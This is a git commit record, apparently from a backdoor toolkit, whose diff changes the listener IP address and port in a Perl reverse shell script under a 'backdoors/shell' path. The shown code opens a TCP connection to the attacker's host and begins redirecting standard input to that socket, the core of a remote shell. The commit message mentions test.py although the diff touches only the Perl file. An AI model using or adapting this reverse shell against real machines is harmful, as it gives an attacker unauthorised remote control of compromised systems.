5b81be5a20c81f95be7e745a33a9612bbba2539c
George Hughey <ghughey@umd.edu>
2017-01-02 18:37:30 -0800

    Fixed test.py for new interpreter

--- backdoors/shell/__perl/prsA.pl
+++ backdoors/shell/__perl/prsA.pl
@@ -1,6 +1,6 @@
 use Socket;
-my $ip = '192.168.121.153';
-my $port = 25973;
+my $ip = '192.168.121.154';
+my $port = 65307;
 socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
 connect(SOCK, sockaddr_in($port,inet_aton($ip)));
 open(STDIN, ">&SOCK");
